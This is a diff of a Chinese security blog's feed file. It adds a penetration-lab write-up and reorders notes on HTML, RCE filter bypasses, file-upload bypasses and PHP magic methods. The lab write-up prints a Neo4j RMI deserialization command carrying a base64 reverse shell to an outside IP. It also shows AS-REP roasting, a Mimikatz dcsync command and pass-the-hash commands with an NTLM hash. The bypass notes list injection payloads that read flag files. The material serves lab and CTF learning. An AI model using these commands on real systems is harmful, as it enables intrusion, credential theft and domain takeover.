@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>春秋云镜之time</title>
+    <link href="/2025/09/24/Time/"/>
+    <url>/2025/09/24/Time/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h1><p><img src="/../Time/376f47a9c35f40af923e89d54269546a.png" alt="img"></p><h2 id="入口机漏洞-neo4j的rmi协议的反序列漏洞"><a href="#入口机漏洞-neo4j的rmi协议的反序列漏洞" class="headerlink" title="入口机漏洞: neo4j的rmi协议的反序列漏洞"></a>入口机漏洞: neo4j的rmi协议的反序列漏洞</h2><p>Neo4j 的 Shell Server 在启用时会暴露一个 RMI 服务。攻击者可以利用 Rhino 库中的已知漏洞链，通过构造恶意对象并调用 <em>setSessionVariable</em> 方法，触发反序列化漏洞，执行任意命令。此漏洞不依赖于 Java 版本，因为它并非传统的 RMI 反序列化漏洞。</p><p>在 <strong>Neo4j 3.5 及之后的版本</strong>，Neo4j Shell 被 Cyber Shell 替代，从而修复了该漏洞</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">java -jar rhino_gadget.jar rmi://39.98.119.66:1337 &quot;bash -c </span><span class="hljs-template-variable">&#123;echo,YmFza...MDA3NyAwPiYx&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>直接弹shell拿flag1，然后传fscan，stowaway，内网渗透，172.22.6.38有一个web服务，sqlmap注入拿flag2，同时发现很多用户</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----+</span>------------------<span class="hljs-code">+---------------+</span><br><span class="hljs-section">| id | password         | username      |</span><br><span class="hljs-section">+----+------------------+---------------+</span><br><span class="hljs-section">| 1  | bo2y8kAL3HnXUiQo | administrator |</span><br><span class="hljs-section">+----+------------------+---------------+</span><br></code></pre></td></tr></table></figure><p>在思考能不能试试登录这个然后甜土豆提权到system，然后再用猕猴桃抓取域管的哈希?</p><p><img src="/../Time/image-20250924002333323.png" alt="image-20250924002333323"></p><p>这样子看应该不能，不然在这里就全剧终了（</p><h2 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS-REP Roasting攻击"></a>AS-REP Roasting攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><img src="/../Time/image-20250924003259018.png" alt="image-20250924003259018"></p><h4 id="1-Kerberos-认证的-“预身份验证”-机制"><a href="#1-Kerberos-认证的-“预身份验证”-机制" class="headerlink" title="1. Kerberos 认证的 “预身份验证” 机制"></a>1. Kerberos 认证的 “预身份验证” 机制</h4><p>Kerberos 认证的第一步是<strong>向域控制器的 “认证服务（AS）” 请求票据授予票（TGT）</strong>。为了防止攻击者 “盲猜” 用户名并请求 TGT，Kerberos 设计了<strong>预身份验证（Pre-Authentication）</strong>：用户必须先通过自己的凭据（如 NTLM 哈希）向 AS “证明身份”，AS 才会响应 TGT 请求。这相当于 “先验明正身，再给票据”，能有效阻止无差别请求。</p><h4 id="2-AS-REP-Roasting-的攻击逻辑"><a href="#2-AS-REP-Roasting-的攻击逻辑" class="headerlink" title="2. AS_REP Roasting 的攻击逻辑"></a>2. AS_REP Roasting 的攻击逻辑</h4><p>当某个<strong>域用户的 “不需要 Kerberos 预身份验证” 选项被开启</strong>（即 “预身份验证被禁用”）时，攻击可发生：</p><ul><li>攻击者无需证明自己是目标用户，可<strong>伪造任意用户名</strong>，直接向 AS 请求该用户的 TGT。</li><li>AS 收到请求后，因目标用户 “免预验证”，会返回<strong>AS_REP（认证服务响应）</strong>。这个 AS_REP 中，包含了<strong>用目标用户 NTLM 哈希加密的内容</strong>（比如会话密钥）。</li><li>攻击者拿到 AS_REP 后，可对其中 “用用户哈希加密的部分” 进行<strong>暴力破解</strong>（用 Hashcat、John 等工具），尝试还原出用户的 NTLM 哈希（甚至明文密码）。若破解成功，就能获取该用户的凭据，用于后续渗透。</li></ul><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><h4 id="验证真实有效的用户"><a href="#验证真实有效的用户" class="headerlink" title="验证真实有效的用户"></a>验证真实有效的用户</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kerbrute_windows_amd64<span class="hljs-selector-class">.exe</span> userenum -d xiaorang<span class="hljs-selector-class">.lab</span> <span class="hljs-attr">--dc</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">6.12</span> user<span class="hljs-selector-class">.txt</span> -t <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>这条命令的目的是：通过<code>kerbrute</code>工具，向<code>xiaorang.lab</code>域的域控制器（<code>172.22.6.12</code>）发送请求，利用<code>user.txt</code>中的用户名列表，枚举该域中真实存在的有效用户账户。</p><h4 id="抓取免预认证的用户响应"><a href="#抓取免预认证的用户响应" class="headerlink" title="抓取免预认证的用户响应"></a>抓取免预认证的用户响应</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> python3 GetNPUsers.py -dc-ip <span class="hljs-number">172.22.6.12</span> -usersfile yu_user.txt xiaorang.lab/<br></code></pre></td></tr></table></figure><p>向域控制器发送请求，检测指定用户列表中哪些用户 “禁用了 Kerberos 预认证”，并获取这些用户的<code>AS_REP</code>响应（包含用用户哈希加密的内容），然后用john离线破解hash，得到了两个用户的登录密码。</p><p>登录后，因为是域用户，可以直接上sharpHound收集一下域内的信息。</p><p><img src="/../Time/image-20250924004934358.png" alt="image-20250924004934358"></p><h2 id="SIDHistory的滥用"><a href="#SIDHistory的滥用" class="headerlink" title="SIDHistory的滥用"></a>SIDHistory的滥用</h2><p>发现yuxuan用户非常可疑</p><p>query user查看本机登录用户信息，发现了该用户，然后在注册表找到了该用户的账号密码，rdp登录</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p>SID（Security Identifier，安全标识符）是 Windows 系统中唯一标识用户、组、计算机等安全主体的 “数字身份证”，系统通过 SID 判断主体的访问权限（而非用户名）。SIDHistory 的设计初衷是<strong>支持跨域迁移时的权限平滑过渡</strong>，避免迁移后用户失去对原域资源的访问权。</p><p><code>YUXUAN</code> 与 <code>ADMINISTRATOR</code> 之间的 <code>HasSidHistory</code> 边，表明 <code>YUXUAN</code> 的 <code>SIDHistory</code> 中被植入了 “管理员 <code>ADMINISTRATOR</code> 的 SID”。根据 Windows 权限验证规则：<strong>系统会同时检查用户的 <code>objectSid</code>（自身 SID）和 <code>SIDHistory</code> 中的所有 SID，只要其中一个 SID 有对应权限，就允许访问</strong>。因此，<code>YUXUAN</code> 会<strong>继承管理员的所有权限</strong>。</p><p>既然yuxuan具有域管的权限，那么直接上次猕猴桃抓取域内所有用户的ntml哈希，其中包括域管的哈希，然后打一个pth的横向移动即可控制所有主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:xiaorang.lab /all /csv <span class="hljs-comment">#Mimikatz 工具中用于从域控制器（DC）同步并导出域内用户凭证信息的命令</span><br></code></pre></td></tr></table></figure><p>这条命令依赖的是域管的权限</p><p><img src="/../Time/9f67b4180323bb300f4fd0357e9b1434.png" alt="9f67b4180323bb300f4fd0357e9b1434"></p><p>这个方法没打通是应该是因为我拿不到这台机子本地管理员的权限</p><h4 id="pth拿flag"><a href="#pth拿flag" class="headerlink" title="pth拿flag"></a>pth拿flag</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> impacket-smbexec -hashes :<span class="hljs-number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="hljs-number">172.22.6.25</span> -codec gbk<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> impacket-smbexec -hashes :<span class="hljs-number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="hljs-number">172.22.6.12</span> -codec gbk<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>春秋云镜之Tsclient</title>
     <link href="/2025/08/31/Tsclient/"/>
     <url>/2025/08/31/Tsclient/</url>
@@ -79,6 +104,31 @@
   
   
   <entry>
+    <title>html的学习</title>
+    <link href="/2025/06/11/html%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
+    <url>/2025/06/11/html%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
+    
+    <content type="html"><![CDATA[<h1 id="html的学习"><a href="#html的学习" class="headerlink" title="html的学习"></a>html的学习</h1><h2 id="1-基本标签"><a href="#1-基本标签" class="headerlink" title="1.基本标签"></a>1.基本标签</h2><pre><code class="hljs">&lt;meta nane=&quot;keywords&quot; content=&quot;html学习,编程&quot; /&gt;&lt;meta name=&quot;description&quot; content=&quot;这是一个关于html的学习&quot;&gt;&lt;meta name=&quot;author&quot;    content=&quot;fearless123&quot;&gt;</code></pre><p>不会显示，给搜索引擎看的</p><pre><code class="hljs">&lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;2&lt;/h2&gt;&lt;h3&gt;3&lt;/h3&gt;&lt;h4&gt;4&lt;/h4&gt;</code></pre><p>标题1到4，逐渐变小</p> <p>这是一个段落<br>br换到下一行<hr>换行线标签，比br多一个分割线</p><p>br换行，hr用线隔开换行</p> <!--strong,b是加粗，i是斜体，u是下划线，sup是上标,sub是下标,del是删除线,font调整字体属性:font size大小，color颜色,pre按代码的格式输出--><h2 id="2-表单form"><a href="#2-表单form" class="headerlink" title="2.表单form"></a>2.表单form</h2><h2 id="1-1-form表单"><a href="#1-1-form表单" class="headerlink" title="1.1.  form表单"></a>1.1.  form表单</h2><p>form表单 规定当提交表单时向何处发送表单数据</p><p>method 提交的方法有 get、post</p><p>规定在发送表单数据之前如何对其进行编码。</p><p>enctype 属性可能的值</p><p>​       application&#x2F;x-www-form-urlencoded    multipart&#x2F;form-data    text&#x2F;plain</p><p>input标签</p><p>name：同样是表示的该文本输入框名称。   size：输入框的长度大小。</p><p>maxlength：输入框中允许输入字符的最大数。  value：输入框中的默认值   readonly：表示该框中只能显示，不能添加修改。</p><p>input的类型</p><p>type&#x3D;password 密码输入框   type&#x3D;file 文件上传    type&#x3D;hidden 隐藏域   button 按钮</p><p>checkbox 复选框   radio 单选框   type&#x3D;submit 提交按钮      type&#x3D;reset  重置按钮</p><p>  <label>第二节课:表单</label> </p>  <form action="" method="post" >         <label>用户名</label><input type="text" name="username" size="30" maxlength="12" value="admin" readonly><br>         <label>密&nbsp;码</label><input type="password" name="password" size="30"  maxlength="12"><br>         <label for="email">邮&nbsp;箱</label><input type="text" name="emali" id="email" ><br> <!--加上id和for，点击汉字即可跳转到输入框-->         <label>掌握技能:<br></label> <label>安全开发</label><input type="checkbox"> <br>         <label>渗透测试</label><input type="checkbox"><br>         <label>性&nbsp;别</label> <label>男<input type="radio" value="1" name="sex">女<input type="radio" value="2" name="sex"></label>         <input type="hidden" value="1"> <br>         <input type="submit" value="提交"> <input type="button" size="40" value="111">         <input type="reset" value="重置"></form>  <br><br><form action="" method="post" enctype="multipart/form-data">​    <label>文件上传</label><input type="file" name="file"><br>​    <input type="submit"></form>]]></content>
+    
+    
+    <categories>
+      
+      <category>开发</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>php反序列化</title>
     <link href="/2025/06/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
     <url>/2025/06/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
@@ -104,16 +154,16 @@
   
   
   <entry>
-    <title>html的学习</title>
-    <link href="/2025/06/11/html%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
-    <url>/2025/06/11/html%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
+    <title>rce进阶</title>
+    <link href="/2025/06/11/rce%E8%BF%9B%E9%98%B6/"/>
+    <url>/2025/06/11/rce%E8%BF%9B%E9%98%B6/</url>
     
-    <content type="html"><![CDATA[<h1 id="html的学习"><a href="#html的学习" class="headerlink" title="html的学习"></a>html的学习</h1><h2 id="1-基本标签"><a href="#1-基本标签" class="headerlink" title="1.基本标签"></a>1.基本标签</h2><pre><code class="hljs">&lt;meta nane=&quot;keywords&quot; content=&quot;html学习,编程&quot; /&gt;&lt;meta name=&quot;description&quot; content=&quot;这是一个关于html的学习&quot;&gt;&lt;meta name=&quot;author&quot;    content=&quot;fearless123&quot;&gt;</code></pre><p>不会显示，给搜索引擎看的</p><pre><code class="hljs">&lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;2&lt;/h2&gt;&lt;h3&gt;3&lt;/h3&gt;&lt;h4&gt;4&lt;/h4&gt;</code></pre><p>标题1到4，逐渐变小</p> <p>这是一个段落<br>br换到下一行<hr>换行线标签，比br多一个分割线</p><p>br换行，hr用线隔开换行</p> <!--strong,b是加粗，i是斜体，u是下划线，sup是上标,sub是下标,del是删除线,font调整字体属性:font size大小，color颜色,pre按代码的格式输出--><h2 id="2-表单form"><a href="#2-表单form" class="headerlink" title="2.表单form"></a>2.表单form</h2><h2 id="1-1-form表单"><a href="#1-1-form表单" class="headerlink" title="1.1.  form表单"></a>1.1.  form表单</h2><p>form表单 规定当提交表单时向何处发送表单数据</p><p>method 提交的方法有 get、post</p><p>规定在发送表单数据之前如何对其进行编码。</p><p>enctype 属性可能的值</p><p>​       application&#x2F;x-www-form-urlencoded    multipart&#x2F;form-data    text&#x2F;plain</p><p>input标签</p><p>name：同样是表示的该文本输入框名称。   size：输入框的长度大小。</p><p>maxlength：输入框中允许输入字符的最大数。  value：输入框中的默认值   readonly：表示该框中只能显示，不能添加修改。</p><p>input的类型</p><p>type&#x3D;password 密码输入框   type&#x3D;file 文件上传    type&#x3D;hidden 隐藏域   button 按钮</p><p>checkbox 复选框   radio 单选框   type&#x3D;submit 提交按钮      type&#x3D;reset  重置按钮</p><p>  <label>第二节课:表单</label> </p>  <form action="" method="post" >         <label>用户名</label><input type="text" name="username" size="30" maxlength="12" value="admin" readonly><br>         <label>密&nbsp;码</label><input type="password" name="password" size="30"  maxlength="12"><br>         <label for="email">邮&nbsp;箱</label><input type="text" name="emali" id="email" ><br> <!--加上id和for，点击汉字即可跳转到输入框-->         <label>掌握技能:<br></label> <label>安全开发</label><input type="checkbox"> <br>         <label>渗透测试</label><input type="checkbox"><br>         <label>性&nbsp;别</label> <label>男<input type="radio" value="1" name="sex">女<input type="radio" value="2" name="sex"></label>         <input type="hidden" value="1"> <br>         <input type="submit" value="提交"> <input type="button" size="40" value="111">         <input type="reset" value="重置"></form>  <br><br><form action="" method="post" enctype="multipart/form-data">​    <label>文件上传</label><input type="file" name="file"><br>​    <input type="submit"></form>]]></content>
+    <content type="html"><![CDATA[<h1 id="rce进阶"><a href="#rce进阶" class="headerlink" title="rce进阶"></a>rce进阶</h1><p>a&#x3D;$a&#x3D;”syst”.”em”;$a(“tac &#x2F;flag”);<br>a&#x3D;echo <code>ls /flag</code>;<br>a&#x3D;print_r(scandir(“.”));  a&#x3D;print_r(file_get_content(“flag&#x2F;php”));</p><p>cmd&#x3D;&#x2F;???&#x2F;?a??64  &#x2F;??a?      &#x2F;&#x2F;禁用字母和符号<br>cmd&#x3D;tac%09&#x2F;flag               &#x2F;&#x2F;禁用空格  %09 $IFS<br>cmd&#x3D;tac &#x2F;flag; || %0a                    &#x2F;&#x2F;绕过 system($cmd.”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);<br>c&#x3D;nl&lt;fla’’g.php||                    &#x2F;&#x2F;禁用%</p><p>八进制绕过</p><p><code>&lt;?php</code></p><p><code>function stringToOctal($string) &#123;     $parts = explode(&#39; &#39;, $string);     $octalParts = [];</code></p><pre><code class="hljs">foreach ($parts as $part) &#123;    $octalArray = [];    for ($i = 0; $i &lt; strlen($part); $i++) &#123;        $octalArray[] = sprintf(&#39;%03o&#39;, ord($part[$i]));    &#125;    $octalString = implode(&#39;\\&#39;, $octalArray);    $octalParts[] = &quot;$&#39;\\$octalString&#39;&quot;;&#125;return implode(&#39; &#39;, $octalParts);</code></pre><p><code>&#125;</code></p><p><code>// 将带分隔符的八进制表示转换为字符串</code><br><code>function octalToString($octal) &#123;     $octalParts = explode(&#39; &#39;, $octal);     $stringParts = [];</code></p><pre><code class="hljs">foreach ($octalParts as $part) &#123;    $strippedOctal = substr($part, 2, -1); // 去掉 $&#39; 和 &#39;    $octalArray = explode(&#39;\\&#39;, $strippedOctal);    $string = &#39;&#39;;    foreach ($octalArray as $octalChar) &#123;        $string .= chr(octdec($octalChar));    &#125;    $stringParts[] = $string;&#125;return implode(&#39; &#39;, $stringParts);</code></pre><p><code>&#125;</code></p><p><code>// 示例用法</code><br><code>$originalString = &quot;cat exp.php&quot;; $octal = stringToOctal($originalString);</code></p><p><code>echo &quot;原始字符串: &quot; . $originalString . &quot;            &quot;; echo &quot;八进制表示: &quot; . $octal ;</code></p><p><code>?&gt;</code></p>]]></content>
     
     
     <categories>
       
-      <category>开发</category>
+      <category>web</category>
       
     </categories>
     
@@ -179,56 +229,6 @@
   
   
   <entry>
-    <title>rce进阶</title>
-    <link href="/2025/06/11/rce%E8%BF%9B%E9%98%B6/"/>
-    <url>/2025/06/11/rce%E8%BF%9B%E9%98%B6/</url>
-    
-    <content type="html"><![CDATA[<h1 id="rce进阶"><a href="#rce进阶" class="headerlink" title="rce进阶"></a>rce进阶</h1><p>a&#x3D;$a&#x3D;”syst”.”em”;$a(“tac &#x2F;flag”);<br>a&#x3D;echo <code>ls /flag</code>;<br>a&#x3D;print_r(scandir(“.”));  a&#x3D;print_r(file_get_content(“flag&#x2F;php”));</p><p>cmd&#x3D;&#x2F;???&#x2F;?a??64  &#x2F;??a?      &#x2F;&#x2F;禁用字母和符号<br>cmd&#x3D;tac%09&#x2F;flag               &#x2F;&#x2F;禁用空格  %09 $IFS<br>cmd&#x3D;tac &#x2F;flag; || %0a                    &#x2F;&#x2F;绕过 system($cmd.”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);<br>c&#x3D;nl&lt;fla’’g.php||                    &#x2F;&#x2F;禁用%</p><p>八进制绕过</p><p><code>&lt;?php</code></p><p><code>function stringToOctal($string) &#123;     $parts = explode(&#39; &#39;, $string);     $octalParts = [];</code></p><pre><code class="hljs">foreach ($parts as $part) &#123;    $octalArray = [];    for ($i = 0; $i &lt; strlen($part); $i++) &#123;        $octalArray[] = sprintf(&#39;%03o&#39;, ord($part[$i]));    &#125;    $octalString = implode(&#39;\\&#39;, $octalArray);    $octalParts[] = &quot;$&#39;\\$octalString&#39;&quot;;&#125;return implode(&#39; &#39;, $octalParts);</code></pre><p><code>&#125;</code></p><p><code>// 将带分隔符的八进制表示转换为字符串</code><br><code>function octalToString($octal) &#123;     $octalParts = explode(&#39; &#39;, $octal);     $stringParts = [];</code></p><pre><code class="hljs">foreach ($octalParts as $part) &#123;    $strippedOctal = substr($part, 2, -1); // 去掉 $&#39; 和 &#39;    $octalArray = explode(&#39;\\&#39;, $strippedOctal);    $string = &#39;&#39;;    foreach ($octalArray as $octalChar) &#123;        $string .= chr(octdec($octalChar));    &#125;    $stringParts[] = $string;&#125;return implode(&#39; &#39;, $stringParts);</code></pre><p><code>&#125;</code></p><p><code>// 示例用法</code><br><code>$originalString = &quot;cat exp.php&quot;; $octal = stringToOctal($originalString);</code></p><p><code>echo &quot;原始字符串: &quot; . $originalString . &quot;            &quot;; echo &quot;八进制表示: &quot; . $octal ;</code></p><p><code>?&gt;</code></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>web</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>web</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>文件上传漏洞</title>
-    <link href="/2025/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
-    <url>/2025/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    
-    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞是指服务器对用户上传的文件类型或内容未严格限制，导致攻击者可上传恶意文件（如木马、脚本），从而在服务器上执行恶意代码的漏洞。</p><h1 id="1-js检查"><a href="#1-js检查" class="headerlink" title="1.js检查:"></a>1.js检查:</h1><p>先是后缀为.jpg，然后利用bp抓包，将后缀改成.php</p><h1 id="2-可解析后缀"><a href="#2-可解析后缀" class="headerlink" title="2.可解析后缀:"></a>2.可解析后缀:</h1><p>如php3 php2等</p><h1 id="3-上传-htaccess和-user-ini文件"><a href="#3-上传-htaccess和-user-ini文件" class="headerlink" title="3.上传.htaccess和.user.ini文件:"></a>3.上传.htaccess和.user.ini文件:</h1><p>就是在Apache服务器中加入特殊脚本，将特定后缀名当做php解析,再上传jpg文件即可</p><p> <code>AddType application/x-httpd-php .jpg</code></p><p>上传完配置文件要访问&#x2F;upload&#x2F;1.png激活木马</p><p>.user.ini</p><p><code>auto_append_file=1.txt</code></p><h1 id="4-大小写绕过"><a href="#4-大小写绕过" class="headerlink" title="4.大小写绕过"></a>4.大小写绕过</h1><h1 id="5-DATA绕过"><a href="#5-DATA绕过" class="headerlink" title="5.::$DATA绕过:"></a>5.::$DATA绕过:</h1><p>利用bp，在php后面加::$DATA</p><p>仅仅windows可以</p><h1 id="6-双写绕过"><a href="#6-双写绕过" class="headerlink" title="6.双写绕过:"></a>6.双写绕过:</h1><p> .pphphp 自动识别第一个php使之为空(后端黑名单删后缀)</p><h1 id="7-0x00绕过"><a href="#7-0x00绕过" class="headerlink" title="7.0x00绕过:"></a>7.0x00绕过:</h1><p>利用bp，修改上传路径包含.php然后加上0x00，使后面的内容无效</p><h1 id="8-黑名单绕过"><a href="#8-黑名单绕过" class="headerlink" title="8.黑名单绕过:"></a>8.黑名单绕过:</h1><p>后缀名后加空格或特殊字符.</p><p>若为一次校验，则在php后使用. <strong>.空格</strong>绕过</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>web</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>web</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>轩辕杯</title>
     <link href="/2025/06/11/%E8%BD%A9%E8%BE%95%E6%9D%AF/"/>
     <url>/2025/06/11/%E8%BD%A9%E8%BE%95%E6%9D%AF/</url>
@@ -259,6 +259,31 @@
     <url>/2025/06/11/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/</url>
     
     <content type="html"><![CDATA[<h1 id="魔术方法的触发条件"><a href="#魔术方法的触发条件" class="headerlink" title="魔术方法的触发条件"></a>魔术方法的触发条件</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example1</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup方法被调用\n&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-string">&quot;初始化数据&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example2</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;1234&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__toString方法被调用\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example3</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct 方法被调用\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example4</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get 方法被调用，属性名：<span class="hljs-subst">$name</span>\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__set 方法被调用，属性名：<span class="hljs-subst">$name</span> 值：<span class="hljs-subst">$value</span>\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example5</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__call 方法被调用，方法名：<span class="hljs-subst">$method</span> 参数：&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;, &#x27;</span>, <span class="hljs-variable">$args</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example6</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__callStatic 方法被调用，方法名：<span class="hljs-subst">$method</span> 参数：&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;, &#x27;</span>, <span 